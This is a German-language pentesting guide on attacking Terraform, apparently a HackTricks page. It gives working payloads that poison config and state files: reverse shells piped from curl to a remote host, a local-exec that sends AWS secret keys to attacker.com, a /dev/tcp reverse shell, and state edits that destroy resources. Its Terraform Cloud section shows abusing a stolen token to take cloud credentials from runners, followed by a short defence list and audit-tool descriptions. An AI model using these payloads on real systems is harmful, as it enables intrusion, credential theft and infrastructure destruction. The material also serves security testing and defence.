# Terraform Sicherheit

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen

[Aus der Dokumentation:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform ist ein **Infrastructure-as-Code-Tool**, mit dem du sowohl **Cloud- als auch On-Prem-Ressourcen** in menschenlesbaren Konfigurationsdateien definieren kannst, die du versionieren, wiederverwenden und teilen kannst. Du kannst anschlie√üend einen konsistenten Workflow nutzen, um deine gesamte Infrastruktur w√§hrend ihres gesamten Lebenszyklus bereitzustellen und zu verwalten. Terraform kann niedrigstufige Komponenten wie Compute-, Storage- und Netzwerkressourcen sowie h√∂herstufige Komponenten wie DNS-Eintr√§ge und SaaS-Funktionen verwalten.

#### Wie funktioniert Terraform?

Terraform erstellt und verwaltet Ressourcen auf Cloud-Plattformen und anderen Services √ºber deren Application Programming Interfaces (APIs). Providers erm√∂glichen es Terraform, mit praktisch jeder Plattform oder jedem Service mit zug√§nglicher API zu arbeiten.

![](<../images/image (177).png>)

HashiCorp und die Terraform-Community haben bereits **mehr als 1700 providers** geschrieben, um Tausende verschiedener Ressourcentypen und Services zu verwalten, und diese Zahl w√§chst weiter. Du findest alle √∂ffentlich verf√ºgbaren providers im [Terraform Registry](https://registry.terraform.io/), einschlie√ülich Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog und vielen weiteren.

Der Kern-Workflow von Terraform besteht aus drei Phasen:

- **Write:** Du definierst Ressourcen, die sich √ºber mehrere Cloud-Provider und Services erstrecken k√∂nnen. Zum Beispiel k√∂nntest du eine Konfiguration erstellen, um eine Anwendung auf VMs in einem Virtual Private Cloud (VPC)-Netzwerk mit security groups und einem load balancer bereitzustellen.
- **Plan:** Terraform erstellt einen Ausf√ºhrungsplan, der beschreibt, welche Infrastruktur es basierend auf der vorhandenen Infrastruktur und deiner Konfiguration erstellen, aktualisieren oder l√∂schen wird.
- **Apply:** Nach Best√§tigung f√ºhrt Terraform die vorgeschlagenen Operationen in der richtigen Reihenfolge aus und ber√ºcksichtigt dabei etwaige Ressourcenabh√§ngigkeiten. Wenn du beispielsweise die Eigenschaften eines VPC √§nderst und die Anzahl der VMs in diesem VPC anpasst, wird Terraform das VPC neu erstellen, bevor es die VMs skaliert.

![](<../images/image (215).png>)

### Terraform-Labor

Installiere einfach terraform auf deinem Computer.

Hier findest du eine [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) und hier ist der [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **hat keine Plattform, die eine Webseite oder einen Netzwerkdienst** exponiert, den wir enumerieren k√∂nnen; daher ist der einzige Weg, terraform zu kompromittieren, die M√∂glichkeit, terraform-Konfigurationsdateien hinzuzuf√ºgen/zu √§ndern oder die terraform state file zu modifizieren (siehe Kapitel weiter unten).

Terraform ist jedoch eine **sehr sensible Komponente** zum Kompromittieren, da es **privilegierten Zugriff** auf verschiedene Orte haben wird, damit es ordnungsgem√§√ü funktioniert.

Der Hauptweg f√ºr einen Angreifer, das System, auf dem terraform l√§uft, zu kompromittieren, ist das Kompromittieren des Repositorys, das die terraform-Konfigurationen speichert, denn irgendwann werden diese ja **interpretiert**.

Tats√§chlich gibt es L√∂sungen, die `terraform plan`/`terraform apply` automatisch ausf√ºhren, nachdem ein PR erstellt wurde, wie zum Beispiel Atlantis:

{{#ref}}
atlantis-security.md
{{#endref}}

Wenn du eine terraform-Datei kompromittieren kannst, gibt es verschiedene Wege, RCE zu erreichen, wenn jemand `terraform plan` oder `terraform apply` ausf√ºhrt.

### Terraform plan

Terraform plan ist der **am h√§ufigsten verwendete Befehl** in terraform und Entwickler/L√∂sungen, die terraform einsetzen, rufen ihn die ganze Zeit auf. Daher ist der **einfachste Weg f√ºr RCE**, sicherzustellen, dass du eine terraform-Konfigurationsdatei vergiftest, die willk√ºrliche Befehle in einem `terraform plan` ausf√ºhrt.

**Using an external provider**

Terraform bietet den `external` provider, der eine Schnittstelle zwischen Terraform und externen Programmen bereitstellt. Du kannst die `external` data source verwenden, um beliebigen Code w√§hrend eines `plan` auszuf√ºhren.

Das Injizieren von etwas wie dem Folgenden in eine terraform-Konfigurationsdatei wird eine rev shell ausf√ºhren, wenn `terraform plan` ausgef√ºhrt wird:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Verwendung eines benutzerdefinierten Providers**

Ein Angreifer k√∂nnte einen [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) an das [Terraform Registry](https://registry.terraform.io/) senden und ihn dann dem Terraform-Code in einem Feature-Branch hinzuf√ºgen ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Der Provider wird beim `init` heruntergeladen und f√ºhrt den b√∂sartigen Code aus, wenn `plan` ausgef√ºhrt wird

Ein Beispiel findest du unter [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**Externe Referenz verwenden**

Beide genannten Optionen sind n√ºtzlich, aber nicht sehr stealthy (die zweite ist stealthier, aber komplexer als die erste). Du kannst diesen Angriff sogar auf eine **stealthier way** ausf√ºhren, indem du den folgenden Vorschl√§gen folgst:

- Statt die rev shell direkt in die terraform-Datei einzuf√ºgen, kannst du eine **externe Ressource laden**, die die rev shell enth√§lt:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Du findest den rev shell code in [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- In der externen Ressource, verwende das **ref** feature, um den **terraform rev shell code in a branch** innerhalb des Repos zu verbergen, so etwas wie: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply wird ausgef√ºhrt, um alle √Ñnderungen anzuwenden, du kannst es auch missbrauchen, um RCE zu erlangen injecting **a malicious Terraform file with** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\

Du musst nur sicherstellen, dass eine Payload wie die folgenden am Ende der Datei `main.tf` steht:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Befolge die **Vorschl√§ge aus der vorherigen Technik**, um diesen Angriff in einer **unauff√§lligeren Weise mit externen Referenzen** durchzuf√ºhren.

## Geheimnisse ausgeben

Du kannst die beim terraform verwendeten **geheimen Werte ausgeben** lassen, wenn du `terraform apply` ausf√ºhrst, indem du der terraform-Datei etwas wie Folgendes hinzuf√ºgst:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Missbrauch von Terraform State-Dateien

In case you have write access over terraform state files but cannot change the terraform code, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) gives some interesting options to take advantage of the file. Even if you would have write access over the config files, using the vector of state files is often way more sneaky, since you do not leave tracks in the `git` history.

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

To use it directly, just include the following at any position of the `resources` array and customize the `name` and the `command` attributes:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Sobald `terraform` ausgef√ºhrt wird, l√§uft dein Code.

### Deleting resources <a href="#deleting-resources" id="deleting-resources"></a>

Es gibt 2 M√∂glichkeiten, Ressourcen zu zerst√∂ren:

1. **F√ºge eine Ressource mit einem zuf√§lligen Namen in die State-Datei ein, die auf die echte Ressource zum Zerst√∂ren zeigt**

Weil `terraform` sehen wird, dass die Ressource nicht existieren sollte, wird es sie zerst√∂ren (entsprechend der angegebenen echten Ressourcen-ID). Beispiel von der vorherigen Seite:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Die Ressource so √§ndern, dass ein Update nicht m√∂glich ist (sie wird gel√∂scht und neu erstellt)**

F√ºr eine EC2-Instanz reicht es, den Typ der Instanz zu √§ndern, damit terraform sie l√∂scht und neu erstellt.

### Gesperrten Provider ersetzen

Falls Sie auf eine Situation sto√üen, in der `hashicorp/external` gesperrt wurde, k√∂nnen Sie den `external` Provider wie folgt neu implementieren. Hinweis: Wir verwenden einen Fork des external Providers, ver√∂ffentlicht unter https://registry.terraform.io/providers/nazarewk/external/latest. Sie k√∂nnen auch einen eigenen Fork oder eine eigene Neuimplementierung ver√∂ffentlichen.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Dann kannst du `external` wie gewohnt verwenden.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

Dieses Szenario missbraucht Terraform Cloud (TFC) runners w√§hrend speculative plans, um in das Ziel-Cloud-Konto zu pivot.

- Preconditions:
- Ein Terraform Cloud-Token von einer Entwickler-Maschine stehlen. Die CLI speichert Tokens im Klartext unter `~/.terraform.d/credentials.tfrc.json`.
- Das Token muss Zugriff auf die Ziel-Organisation/workspace und mindestens die `plan`-Berechtigung haben. VCS-backed workspaces blockieren `apply` von der CLI, erlauben aber weiterhin speculative plans.

- Discover workspace and VCS settings via the TFC API:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Codeausf√ºhrung w√§hrend eines speculative plan ausl√∂sen, indem die external data source und der Terraform Cloud "cloud" block verwendet werden, um das VCS-backed workspace anzuzielen:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Beispiel rsync.sh, um auf dem TFC runner eine reverse shell zu erhalten:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
F√ºhre einen spekulativen Plan aus, um das Programm auf dem ephemeren Runner auszuf√ºhren:
```bash
terraform init
terraform plan
```
- Enumerate and exfiltrate injected cloud credentials vom runner. W√§hrend der Runs injiziert TFC provider credentials √ºber Dateien und environment variables:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
Erwartete Dateien im Arbeitsverzeichnis des Runners:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON-Konfiguration)
- `tfc-gcp-token` (kurzlebiges GCP-Zugriffstoken)
- AWS:
- `tfc-aws-shared-config` (Konfiguration f√ºr Web Identity/OIDC-Rollen√ºbernahme)
- `tfc-aws-token` (kurzlebiges Token; einige Organisationen verwenden m√∂glicherweise statische Schl√ºssel)

- Verwende die kurzlebigen Anmeldeinformationen au√üerhalb des normalen Ablaufs, um VCS-Gates zu umgehen:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Mit diesen Zugangsdaten k√∂nnen Angreifer Ressourcen direkt √ºber native CLIs erstellen/modifizieren/zerst√∂ren und so PR-basierte Workflows umgehen, die `apply` via VCS blockieren.

- Defensive guidance:
- Wende das Least-Privilege-Prinzip auf TFC-Benutzer/Teams und Tokens an. Pr√ºfe Mitgliedschaften und vermeide √ºberm√§√üig viele Owner.
- Beschr√§nke die `plan`-Berechtigung f√ºr sensible VCS-gebundene Workspaces, wo m√∂glich.
- Erzwinge Provider/Datensource-Allowlists mit Sentinel-Policies, um `data "external"` oder unbekannte Provider zu blockieren. Siehe HashiCorp-Anleitung zum Provider-Filtering.
- Bevorzuge OIDC/WIF gegen√ºber statischen Cloud-Credentials; behandle runner als sensibel. √úberwache spekulative plan-Ausf√ºhrungen und unerwartetes Egress.
- Erkenne Exfiltration von `tfc-*` Credential-Artefakten und alarmiere bei verd√§chtiger Nutzung von `external`-Programmen w√§hrend Plans.


## Kompromittierung von Terraform Cloud

### Nutzung eines Tokens

Wie **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)** erkl√§rt, speichert die terraform CLI Tokens im Klartext unter **`~/.terraform.d/credentials.tfrc.json`**. Das Entwenden dieses Tokens erm√∂glicht einem Angreifer, sich innerhalb des Berechtigungsumfangs des Tokens als der Benutzer auszugeben.

Mit diesem Token kann man die org/workspace abrufen mit:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Dann ist es m√∂glich, beliebigen Code mit **`terraform plan`** auszuf√ºhren, wie im vorherigen Kapitel erkl√§rt.

### Ausbruch in die Cloud

Wenn der Runner in einer Cloud-Umgebung l√§uft, ist es m√∂glich, ein Token des dem Runner zugeordneten principal zu erhalten und es au√üerhalb des Ablaufs zu verwenden.

- **GCP files (im aktuellen Arbeitsverzeichnis der Ausf√ºhrung vorhanden)**
- `tfc-google-application-credentials` ‚Äî JSON-Konfiguration f√ºr Workload Identity Federation (WIF), die Google angibt, wie die externe Identit√§t ausgetauscht wird.
- `tfc-gcp-token` ‚Äî kurzlebiges (‚âà1 Stunde) GCP access token, auf das oben verwiesen wird

- **AWS-Dateien**
- `tfc-aws-shared-config` ‚Äî JSON f√ºr web identity federation/OIDC role assumption (bevorzugt gegen√ºber statischen Keys).
- `tfc-aws-token` ‚Äî kurzlebiges Token oder bei Fehlkonfiguration m√∂glicherweise statische IAM-Keys.


## Automatische Audit-Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk bietet eine umfassende Infrastructure as Code (IaC) Scanning-L√∂sung, die Schwachstellen und Fehlkonfigurationen in Terraform, CloudFormation, Kubernetes und anderen IaC-Formaten erkennt.

- **Features:**
- Echtzeit-Scanning auf Sicherheitsl√ºcken und Compliance-Probleme.
- Integration mit Version-Control-Systemen (GitHub, GitLab, Bitbucket).
- Automatisierte Fix-Pull-Requests.
- Detaillierte Empfehlungen zur Behebung.
- **Sign Up:** Erstellen Sie ein Konto bei [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** ist ein statisches Code-Analyse-Tool f√ºr Infrastructure as Code (IaC) und au√üerdem ein Software Composition Analysis (SCA)-Tool f√ºr Images und Open-Source-Pakete.

Es scannt Cloud-Infrastruktur, die mit [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), or [OpenTofu](https://opentofu.org/) bereitgestellt wurde, und erkennt Sicherheits- und Compliance-Fehlkonfigurationen mithilfe graphbasierter Scans.

Es f√ºhrt [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md) durch, bei dem Open-Source-Pakete und Images auf Common Vulnerabilities and Exposures (CVEs) untersucht werden.
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

Aus den [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` ist ein leichtgewichtiges, auf Security und Compliance ausgerichtetes Test-Framework f√ºr terraform, das negative Testm√∂glichkeiten f√ºr Ihre infrastructure-as-code bietet.

- **compliance:** Sicherstellen, dass der implementierte Code Sicherheitsstandards und Ihre eigenen Richtlinien einh√§lt
- **behaviour driven development:** Wir haben BDD f√ºr fast alles ‚Äî warum nicht auch f√ºr IaC?
- **portable:** einfach mit `pip` installieren oder per `docker` ausf√ºhren. Siehe [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** es validiert Ihren Code, bevor er bereitgestellt wird
- **easy to integrate:** es kann in Ihrer Pipeline (oder in git hooks) laufen, um sicherzustellen, dass alle Deployments validiert werden.
- **segregation of duty:** Sie k√∂nnen Ihre Tests in einem separaten Repository halten, in dem ein anderes Team verantwortlich ist.

> [!NOTE]
> Leider: Wenn der Code Provider verwendet, auf die Sie keinen Zugriff haben, k√∂nnen Sie kein `terraform plan` ausf√ºhren und dieses Tool nicht betreiben.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Aus den [**docs**](https://github.com/aquasecurity/tfsec): tfsec verwendet statische Analyse Ihres terraform-Codes, um potenzielle Fehlkonfigurationen aufzusp√ºren.

- ‚òÅÔ∏è Pr√ºft auf Fehlkonfigurationen bei allen gro√üen (und einigen kleineren) Cloud-Anbietern
- ‚õî Hunderte integrierter Regeln
- ü™Ü Scannt Module (lokal und remote)
- ‚ûï Bewertet HCL-Ausdr√ºcke sowie Literalwerte
- ‚Ü™Ô∏è Bewertet Terraform-Funktionen, z. B. `concat()`
- üîó Analysiert Beziehungen zwischen Terraform-Ressourcen
- üß∞ Kompatibel mit dem Terraform CDK
- üôÖ Wendet benutzerdefinierte Rego-Policies an (und erweitert sie)
- üìÉ Unterst√ºtzt mehrere Ausgabeformate: lovely (Standard), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- üõ†Ô∏è Konfigurierbar (per CLI-Flags und/oder Konfigurationsdatei)
- ‚ö° Sehr schnell, kann gro√üe Repositories z√ºgig scannen
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan ist ein statisches Code-Analyse-Tool f√ºr Infrastructure as Code. Terrascan erm√∂glicht Ihnen:

- Scannt nahtlos Infrastructure as Code auf Fehlkonfigurationen.
- √úberwacht bereitgestellte Cloud-Infrastruktur auf Konfigurations√§nderungen, die zu einem Drift der Sicherheitslage f√ºhren, und erm√∂glicht das Zur√ºckkehren zu einer sicheren Konfiguration.
- Erkennt Sicherheitsl√ºcken und Compliance-Verst√∂√üe.
- Reduziert Risiken, bevor cloud-native Infrastruktur bereitgestellt wird.
- Bietet die Flexibilit√§t, lokal ausgef√ºhrt zu werden oder in Ihre CI\CD zu integrieren.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

Finde Sicherheitsl√ºcken, Compliance-Probleme und Fehlkonfigurationen der Infrastruktur fr√ºh im Entwicklungszyklus deiner Infrastructure-as-Code mit **KICS** von Checkmarx.

**KICS** steht f√ºr **K**eeping **I**nfrastructure as **C**ode **S**ecure, es ist Open Source und ein Muss f√ºr jedes cloud-native Projekt.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Aus den [**docs**](https://github.com/tenable/terrascan): Terrascan ist ein statischer Code-Analyzer f√ºr Infrastructure as Code. Terrascan erm√∂glicht:

- Infrastructure as Code nahtlos auf Fehlkonfigurationen zu scannen.
- Bereitgestellte Cloud-Infrastruktur auf Konfigurations√§nderungen zu √ºberwachen, die Posture Drift verursachen, und das Zur√ºcksetzen auf einen sicheren Zustand zu erm√∂glichen.
- Sicherheitsl√ºcken und Compliance-Verst√∂√üe zu erkennen.
- Risiken zu mindern, bevor cloud-native Infrastruktur bereitgestellt wird.
- Flexibilit√§t zu bieten, lokal ausgef√ºhrt zu werden oder in Ihr CI\CD integriert zu werden.
```bash
brew install terrascan
```
## Referenzen

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API ‚Äì Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI ‚Äì OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider ‚Äì Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform ‚Äì Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs ‚Äì Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
